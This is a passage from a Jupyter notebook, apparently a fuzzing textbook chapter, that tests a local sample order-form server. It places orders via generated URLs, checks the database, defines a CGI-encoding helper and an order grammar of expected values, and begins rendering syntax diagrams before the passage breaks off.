  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:00.651589Z",
     "iopub.status.busy": "2021-11-01T22:34:00.651024Z",
     "iopub.status.idle": "2021-11-01T22:34:00.653032Z",
     "shell.execute_reply": "2021-11-01T22:34:00.653403Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "print_httpd_messages()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "We can also see any orders placed in the database:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 61,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:00.656822Z",
     "iopub.status.busy": "2021-11-01T22:34:00.656287Z",
     "iopub.status.idle": "2021-11-01T22:34:00.658257Z",
     "shell.execute_reply": "2021-11-01T22:34:00.658629Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[]\n"
     ]
    }
   ],
   "source": [
    "print(db.execute(\"SELECT * FROM orders\").fetchall())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "And we can clear the order database:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:00.661867Z",
     "iopub.status.busy": "2021-11-01T22:34:00.661292Z",
     "iopub.status.idle": "2021-11-01T22:34:00.664657Z",
     "shell.execute_reply": "2021-11-01T22:34:00.665050Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "db.execute(\"DELETE FROM orders\")\n",
    "db.commit()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "#### Retrieving the Home Page\n",
    "\n",
    "Even if our browser cannot directly interact with the server, the _notebook_ can.  We can, for instance, retrieve the contents of the home page and display them:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 63,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:00.669138Z",
     "iopub.status.busy": "2021-11-01T22:34:00.668582Z",
     "iopub.status.idle": "2021-11-01T22:34:00.684314Z",
     "shell.execute_reply": "2021-11-01T22:34:00.683928Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [01/Nov/2021 23:34:00] \"GET / HTTP/1.1\" 200 -\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "contents = webbrowser(httpd_url)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 64,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:00.687720Z",
     "iopub.status.busy": "2021-11-01T22:34:00.687145Z",
     "iopub.status.idle": "2021-11-01T22:34:00.689550Z",
     "shell.execute_reply": "2021-11-01T22:34:00.689919Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<form action=\"/order\" style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Fuzzingbook Swag Order Form</strong>\n",
       "  <p>\n",
       "  Yes! Please send me at your earliest convenience\n",
       "  <select name=\"item\">\n",
       "  <option value=\"tshirt\">One FuzzingBook T-Shirt</option>\n",
       "<option value=\"drill\">One FuzzingBook Rotary Hammer</option>\n",
       "<option value=\"lockset\">One FuzzingBook Lock Set</option>\n",
       "\n",
       "  </select>\n",
       "  <br>\n",
       "  <table>\n",
       "  <tr><td>\n",
       "  <label for=\"name\">Name: </label><input type=\"text\" name=\"name\">\n",
       "  </td><td>\n",
       "  <label for=\"email\">Email: </label><input type=\"email\" name=\"email\"><br>\n",
       "  </td></tr>\n",
       "  <tr><td>\n",
       "  <label for=\"city\">City: </label><input type=\"text\" name=\"city\">\n",
       "  </td><td>\n",
       "  <label for=\"zip\">ZIP Code: </label><input type=\"number\" name=\"zip\">\n",
       "  </tr></tr>\n",
       "  </table>\n",
       "  <input type=\"checkbox\" name=\"terms\"><label for=\"terms\">I have read\n",
       "  the <a href=\"/terms\">terms and conditions</a></label>.<br>\n",
       "  <input type=\"submit\" name=\"submit\" value=\"Place order\">\n",
       "</p>\n",
       "</form>\n",
       "</body></html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 64,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "HTML(contents)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "#### Placing Orders\n",
    "\n",
    "To test this form, we can generate URLs with orders and have the server process them."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "The method `urljoin()` puts together a base URL (i.e., the URL of our server) and a path – say, the path towards our order."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 65,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:00.693076Z",
     "iopub.status.busy": "2021-11-01T22:34:00.692540Z",
     "iopub.status.idle": "2021-11-01T22:34:00.694068Z",
     "shell.execute_reply": "2021-11-01T22:34:00.694613Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from urllib.parse import urljoin, urlsplit"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 66,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:00.697979Z",
     "iopub.status.busy": "2021-11-01T22:34:00.697420Z",
     "iopub.status.idle": "2021-11-01T22:34:00.699700Z",
     "shell.execute_reply": "2021-11-01T22:34:00.700122Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'http://127.0.0.1:8800/order?foo=bar'"
      ]
     },
     "execution_count": 66,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "urljoin(httpd_url, \"/order?foo=bar\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "With `urljoin()`, we can create a full URL that is the same as the one generated by the browser as we submit the order form.  Sending this URL to the browser effectively places the order, as we can see in the server log produced:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 67,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:00.703372Z",
     "iopub.status.busy": "2021-11-01T22:34:00.702857Z",
     "iopub.status.idle": "2021-11-01T22:34:00.713445Z",
     "shell.execute_reply": "2021-11-01T22:34:00.713820Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [01/Nov/2021 23:34:00] INSERT INTO orders VALUES ('tshirt', 'Jane Doe', 'doe@example.com', 'Seattle', '98104')\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [01/Nov/2021 23:34:00] \"GET /order?item=tshirt&name=Jane+Doe&email=doe%40example.com&city=Seattle&zip=98104 HTTP/1.1\" 200 -\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "contents = webbrowser(urljoin(httpd_url,\n",
    "                              \"/order?item=tshirt&name=Jane+Doe&email=doe%40example.com&city=Seattle&zip=98104\"))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "The web page returned confirms the order:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 68,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:00.717274Z",
     "iopub.status.busy": "2021-11-01T22:34:00.716712Z",
     "iopub.status.idle": "2021-11-01T22:34:00.719119Z",
     "shell.execute_reply": "2021-11-01T22:34:00.719488Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Thank you for your Fuzzingbook Order!</strong>\n",
       "  <p id=\"confirmation\">\n",
       "  We will send <strong>One FuzzingBook T-Shirt</strong> to Jane Doe in Seattle, 98104<br>\n",
       "  A confirmation mail will be sent to doe@example.com.\n",
       "  </p>\n",
       "  <p>\n",
       "  Want more swag?  Use our <a href=\"/\">order form</a>!\n",
       "  </p>\n",
       "</div>\n",
       "</body></html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 68,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "HTML(contents)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "And the order is in the database, too:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 69,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:00.722584Z",
     "iopub.status.busy": "2021-11-01T22:34:00.722066Z",
     "iopub.status.idle": "2021-11-01T22:34:00.724122Z",
     "shell.execute_reply": "2021-11-01T22:34:00.724490Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[('tshirt', 'Jane Doe', 'doe@example.com', 'Seattle', '98104')]\n"
     ]
    }
   ],
   "source": [
    "print(db.execute(\"SELECT * FROM orders\").fetchall())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "#### Error Messages\n",
    "\n",
    "We can also test whether the server correctly responds to invalid requests.  Nonexistent pages, for instance, are correctly handled:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 70,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:00.727838Z",
     "iopub.status.busy": "2021-11-01T22:34:00.727159Z",
     "iopub.status.idle": "2021-11-01T22:34:00.734273Z",
     "shell.execute_reply": "2021-11-01T22:34:00.734709Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [01/Nov/2021 23:34:00] \"GET /some/other/path HTTP/1.1\" 404 -\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Sorry.</strong>\n",
       "  <p>\n",
       "  This page does not exist.  Try our <a href=\"/\">order form</a> instead.\n",
       "  </p>\n",
       "</div>\n",
       "</body></html>\n",
       "  "
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 70,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "HTML(webbrowser(urljoin(httpd_url, \"/some/other/path\")))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "You may remember we also have a page for internal server errors.  Can we get the server to produce this page?  To find this out, we have to test the server thoroughly – which we do in the remainder of this chapter."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Fuzzing Input Forms\n",
    "\n",
    "After setting up and starting the server, let us now go and systematically test it – first with expected, and then with less expected values."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### Fuzzing with Expected Values\n",
    "\n",
    "Since placing orders is all done by creating appropriate URLs, we define a [grammar](Grammars.ipynb) `ORDER_GRAMMAR` which encodes ordering URLs.  It comes with a few sample values for names, email addresses, cities and (random) digits."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "To make it easier to define strings that become part of a URL, we define the function `cgi_encode()`, taking a string and autmatically encoding it into CGI:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 71,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:00.737918Z",
     "iopub.status.busy": "2021-11-01T22:34:00.737405Z",
     "iopub.status.idle": "2021-11-01T22:34:00.739065Z",
     "shell.execute_reply": "2021-11-01T22:34:00.739462Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "import string"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 72,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:00.743308Z",
     "iopub.status.busy": "2021-11-01T22:34:00.742774Z",
     "iopub.status.idle": "2021-11-01T22:34:00.744588Z",
     "shell.execute_reply": "2021-11-01T22:34:00.744963Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "def cgi_encode(s, do_not_encode=\"\"):\n",
    "    ret = \"\"\n",
    "    for c in s:\n",
    "        if (c in string.ascii_letters or c in string.digits\n",
    "                or c in \"$-_.+!*'(),\" or c in do_not_encode):\n",
    "            ret += c\n",
    "        elif c == ' ':\n",
    "            ret += '+'\n",
    "        else:\n",
    "            ret += \"%%%02x\" % ord(c)\n",
    "    return ret"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 73,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:00.748249Z",
     "iopub.status.busy": "2021-11-01T22:34:00.747719Z",
     "iopub.status.idle": "2021-11-01T22:34:00.749972Z",
     "shell.execute_reply": "2021-11-01T22:34:00.750338Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Is+%22DOW30%22+down+.24%25%3f'"
      ]
     },
     "execution_count": 73,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "s = cgi_encode('Is \"DOW30\" down .24%?')\n",
    "s"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "The optional parameter `do_not_encode` allows us to skip certain characters from encoding.  This is useful when encoding grammar rules:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 74,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:00.753727Z",
     "iopub.status.busy": "2021-11-01T22:34:00.753179Z",
     "iopub.status.idle": "2021-11-01T22:34:00.755461Z",
     "shell.execute_reply": "2021-11-01T22:34:00.755830Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'<string>%40<string>'"
      ]
     },
     "execution_count": 74,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "cgi_encode(\"<string>@<string>\", \"<>\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "`cgi_encode()` is the exact counterpart of the `cgi_decode()` function defined in the [chapter on coverage](Coverage.ipynb):"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 75,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:00.758736Z",
     "iopub.status.busy": "2021-11-01T22:34:00.758226Z",
     "iopub.status.idle": "2021-11-01T22:34:01.924664Z",
     "shell.execute_reply": "2021-11-01T22:34:01.925051Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from Coverage import cgi_decode  # minor dependency"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 76,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:01.929207Z",
     "iopub.status.busy": "2021-11-01T22:34:01.928516Z",
     "iopub.status.idle": "2021-11-01T22:34:01.931678Z",
     "shell.execute_reply": "2021-11-01T22:34:01.932088Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Is \"DOW30\" down .24%?'"
      ]
     },
     "execution_count": 76,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "cgi_decode(s)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Now for the grammar.  We make use of `cgi_encode()` to encode strings:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 77,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:01.936114Z",
     "iopub.status.busy": "2021-11-01T22:34:01.935316Z",
     "iopub.status.idle": "2021-11-01T22:34:02.643673Z",
     "shell.execute_reply": "2021-11-01T22:34:02.643110Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from Grammars import crange, is_valid_grammar, syntax_diagram"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 78,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:02.648143Z",
     "iopub.status.busy": "2021-11-01T22:34:02.647608Z",
     "iopub.status.idle": "2021-11-01T22:34:02.649574Z",
     "shell.execute_reply": "2021-11-01T22:34:02.649931Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "ORDER_GRAMMAR = {\n",
    "    \"<start>\": [\"<order>\"],\n",
    "    \"<order>\": [\"/order?item=<item>&name=<name>&email=<email>&city=<city>&zip=<zip>\"],\n",
    "    \"<item>\": [\"tshirt\", \"drill\", \"lockset\"],\n",
    "    \"<name>\": [cgi_encode(\"Jane Doe\"), cgi_encode(\"John Smith\")],\n",
    "    \"<email>\": [cgi_encode(\"j.doe@example.com\"), cgi_encode(\"j_smith@example.com\")],\n",
    "    \"<city>\": [\"Seattle\", cgi_encode(\"New York\")],\n",
    "    \"<zip>\": [\"<digit>\" * 5],\n",
    "    \"<digit>\": crange('0', '9')\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 79,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:02.653001Z",
     "iopub.status.busy": "2021-11-01T22:34:02.652488Z",
     "iopub.status.idle": "2021-11-01T22:34:02.654350Z",
     "shell.execute_reply": "2021-11-01T22:34:02.654730Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "assert is_valid_grammar(ORDER_GRAMMAR)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 80,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-11-01T22:34:02.658193Z",
     "iopub.status.busy": "2021-11-01T22:34:02.657684Z",
     "iopub.status.idle": "2021-11-01T22:34:02.682050Z",
     "shell.execute_reply": "2021-11-01T22:34:02.682420Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "start\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": [
       "<svg xmlns=\"http://www.w3.org/2000/svg\" class=\"railroad-diagram\" height=\"62\" viewBox=\"0 0 182.5 62\" width=\"182.5\">\n",
       "<g transform=\"translate(.5 .5)\">\n",
       "<style>/* <![CDATA[ */\n",
       "    svg.railroad-diagram {\n",
       "    }\n",
       "    svg.railroad-diagram path {\n",
       "        stroke-width:3;\n",
       "        stroke:black;\n",
       "        fill:white;\n",
       "    }\n",
       "    svg.railroad-diagram text {\n",
       "        font:14px \"Fira Mono\", monospace;\n",
       "        text-anchor:middle;\n",
       "    }\n",
       "    svg.railroad-diagram text.label{\n",
       "        text-anchor:start;\n",
       "    }\n",
       "    svg.railroad-diagram text.comment{\n",
       "        font:italic 12px \"Fira Mono\", monospace;\n",
       "    }\n",
       "    svg.railroad-diagram rect{\n",
       "        stroke-width:2;\n",
       "        stroke:black;\n",
       "        fill:mistyrose;\n",
       "    }\n",
       "\n",
       "/* ]]> */\n",
       "</style><g>\n",
       "<path d=\"M20 21v20m10 -20v20m-10 -10h20\"/></g><g>\n",
       "<path d=\"M40 31h0.0\"/><path d=\"M142.5 31h0.0\"/><path d=\"M40.0 31h20\"/><g>\n",
       "<path d=\"M60.0 31h0.0\"/><path d=\"M122.5 31h0.0\"/><g class=\"non-terminal\">\n",
       "<path d=\"M60.0 31h0.0\"/><path d=\"M122.5 31h0.0\"/><rect height=\"22\" width=\"62.5\" x=\"60.0\" y=\"20\"/><text x=\"91.25\" y=\"35\">order</text></g></g><path d=\"M122.5 31h20\"/></g><path d=\"M 142.5 31 h 20 m -10 -10 v 20 m 10 -20 v 20\"/></g></svg>"
      ],
      "text/plain": [
       "<IPython.core.display.SVG object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "order\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": [
       "<svg xmlns=\"http://www.w3.org/2000/svg\" class=\"railroad-diagram\" height=\"62\" viewBox=\"0 0 976.0 62\" width=\"976.0\">\n",
       "<g transform=\"translate(.5 .5)\">\n",
       "<style>/* <![CDATA[ */\n",
       "    svg.railroad-diagram {\n",
       "    }\n",
       "    svg.railroad-diagram path {\n",
       "        stroke-width:3;\n",
       "        stroke:black;\n",
       "        fill:white;\n",
       "    }\n",
       "    svg.railroad-diagram text {\n",
       "        font:14px \"Fira Mono\", monospace;\n",
       "        text-anchor:middle;\n",
       "    }\n",
       "    svg.railroad-diagram text.label{\n",
       "        text-anchor:start;\n",
       "    }\n",
       "    svg.railroad-diagram text.comment{\n",
       "        font:italic 12px \"Fira Mono\", monospace;\n",
       "    }\n",
       "    svg.railroad-diagram rect{\n",
       "        stroke-width:2;\n",
       "        stroke:black;\n",
       "        fill:mistyrose;\n",
       "    }\n",
       "\n",
       "/* ]]> */\n",
       "</style><g>\n",
       "<path d=\"M20 21v20m10 -20v20m-10 -10h20\"/></g><g>\n",
       "<path d=\"M40 31h0.0\"/><path d=\"M936.0 31h0.0\"/><path d=\"M40.0 31h20\"/><g>\n",
       "<path d=\"M60.0 31h0.0\"/><path d=\"M916.0 31h0.0\"/><g class=\"terminal\">\n",
       "<path d=\"M60.0 31h0.0\"/><path d=\"M182.0 31h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"122.0\" x=\"60.0\" y=\"20\"/><text x=\"121.0\" y=\"35\">/order?item=</text></g><path d=\"M182.0 31h10\"/><path d=\"M192.0 31h10\"/><g class=\"non-terminal\">\n",
       "<path d=\"M202.0 31h0.0\"/><path d=\"M256.0 31h0.0\"/><rect height=\"22\" width=\"54.0\" x=\"202.0\" y=\"20\"/><text x=\"229.0\" y=\"35\">item</text></g><path d=\"M256.0 31h10\"/><path d=\"M266.0 31h10\"/><g class=\"terminal\">\n",
       "<path d=\"M276.0 31h0.0\"/><path d=\"M347.0 31h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"71.0\" x=\"276.0\" y=\"20\"/><text x=\"311.5\" y=\"35\">&amp;name=</text></g><path d=\"M347.0 31h10\"/><path d=\"M357.0 31h10\"/><g class=\"non-terminal\">\n",
       "<path d=\"M367.0 31h0.0\"/><path d=\"M421.0 31h0.0\"/><rect height=\"22\" width=\"54.0\" x=\"367.0\" y=\"20\"/><text x=\"394.0\" y=\"35\">name</text></g><path d=\"M421.0 31h10\"/><path d=\"M431.0 31h10\"/><g class=\"terminal\">\n",
       "<path d=\"M441.0 31h0.0\"/><path d=\"M520.5 31h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"79.5\" x=\"441.0\" y=\"20\"/><text x=\"480.75\" y=\"35\">&amp;email=</text></g><path d=\"M520.5 31h10\"/><path d=\"M530.5 31h10\"/><g class=\"non-terminal\">\n",
       "<path d=\"M540.5 31h0.0\"/><path d=\"M603.0 31h0.0\"/><rect height=\"22\" width=\"62.5\" x=\"540.5\" y=\"20\"/><text x=\"571.75\" y=\"35\">email</text></g><path d=\"M603.0 31h10\"/><path d=\"M613.0 31h10\"/><g class=\"terminal\">\n",
       "<path d=\"M623.0 31h0.0\"/><path d=\"M694.0 31h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"71.0\" x=\"623.0\" y=\"20\"/><text x=\"658.5\" y=\"35\">&amp;city=</text></g><path d=\"M694.0 31h10\"/><path d=\"M704.0 31h10\"/><g class=\"non-terminal\">\n",
       "<path d=\"M714.0 31h0.0\"/><path d=\"M768.0 31h0.0\"/><rect height=\"22\" width=\"54.0\" x=\"714.0\" y=\"20\"/><text x=\"741.0\" y=\"35\">city</text></g><path d=\"M768.0 31h10\"/><path d=\"M778.0 31h10\"/><g class=\"terminal\">\n",
       "<path d=\"M788.0 31h0.0\"/><path d=\"M850.5 31h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"62.5\" x=\"788.0\" y=\"20\"/><text x=\"819.25\" y=\"35\">&amp;zip=</text></g><path d=\"M850.5 31h10\"/><path d=\"M860.5 31h10\"/><g class=\"non-terminal\">\n",
       "<path d=\"M870.5 31h0.0\"/><path d=\"M916.0 31h0.0\"/><rect height=\"22\" width=\"45.5\" x=\"870.5\" y=\"20\"/><text x=\"893.25\" y=\"35\">zip</text></g></g><path d=\"M916.0 31h20\"/></g><path d=\"M 936.0 31 h 20 m -10 -10 v 20 m 10 -20 v 20\"/></g></svg>"
      ],
      "text/plain": [
       "<IPython.core.display.SVG object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "item\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": [
       "<svg xmlns=\"http://www.w3.org/2000/svg\" class=\"railroad-diagram\" height=\"122\" viewBox=\"0 0 199.5 122\" width=\"199.5\">\n",
       "<g transform=\"translate(.5 .5)\">\n",
       "<style>/* <![CDATA[ */\n",
       "    svg.railroad-diagram {\n",
       "    }\n",
       "    svg.railroad-diagram path {\n",
       "        stroke-width:3;\n",
       "        stroke:black;\n",
       "        fill:white;\n",
       "    }\n",
       "    svg.railroad-diagram text {\n",
       "        font:14px \"Fira Mono\", monospace;\n",
       "        text-anchor:middle;\n",
       "    }\n",
       "    svg.railroad-diagram text.label{\n",
       "        text-anchor:start;\n",
       "    }\n",
       "    svg.railroad-diagram text.comment{\n",
       "        font:italic 12px \"Fira Mono\", monospace;\n",
       "    }\n",
       "    svg.railroad-diagram rect{\n",
       "        stroke-width:2;\n",
       "        stroke:black;\n",
       "        fill:mistyrose;\n",
       "    }\n",
       "\n",
       "/* ]]> */\n",
       "</style><g>\n",
       "<path d=\"M20 51v20m10 -20v20m-10 -10h20\"/></g><g>\n",
       "<path d=\"M40 61h0.0\"/><path d=\"M159.5 61h0.0\"/><path d=\"M40.0 61a10 10 0 0 0 10 -10v-10a10 10 0 0 1 10 -10\"/><g>\n",
       "<path d=\"M60.0 31h4.25\"/><path d=\"M135.25 31h4.25\"/><g class=\"terminal\">\n",
       "<path d=\"M64.25 31h0.0\"/><path d=\"M135.25 31h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"71.0\" x=\"64.25\" y=\"20\"/><text x=\"99.75\" y=\"35\">tshirt</text></g></g><path d=\"M139.5 31a10 10 0 0 1 10 10v10a10 10 0 0 0 10 10\"/><path d=\"M40.0 61h20\"/><g>\n",
       "<path d=\"M60.0 61h8.5\"/><path d=\"M131.0 61h8.5\"/><g class=\"terminal\">\n",
       "<path d=\"M68.5 61h0.0\"/><path d=\"M131.0 61h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"62.5\" x=\"68.5\" y=\"50\"/><text x=\"99.75\" y=\"65\">drill</text></g></g><path d=\"M139.5 61h20\"/><path d=\"M40.0 61a10 10 0 0 1 10 10v10a10 10 0 0 0 10 10\"/><g>\n",
       "<path d=\"M60.0 91h0.0\"/><path d=\"M139.5 91h0.0\"/><g class=\"terminal\">\n",
       "<path d=\"M60.0 91h0.0\"/><path d=\"M139.5 91h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"79.5\" x=\"60.0\" y=\"80\"/><text x=\"99.75\" y=\"95\">lockset</text></g></g><path d=\"M139.5 91a10 10 0 0 0 10 -10v-10a10 10 0 0 1 10 -10\"/></g><path d=\"M 159.5 61 h 20 m -10 -10 v 20 m 10 -20 v 20\"/></g></svg>"
      ],
      "text/plain": [
       "<IPython.core.display.SVG object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "name\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": [
       "<svg xmlns=\"http://www.w3.org/2000/svg\" class=\"railroad-diagram\" height=\"92\" viewBox=\"0 0 225.0 92\" width=\"225.0\">\n",
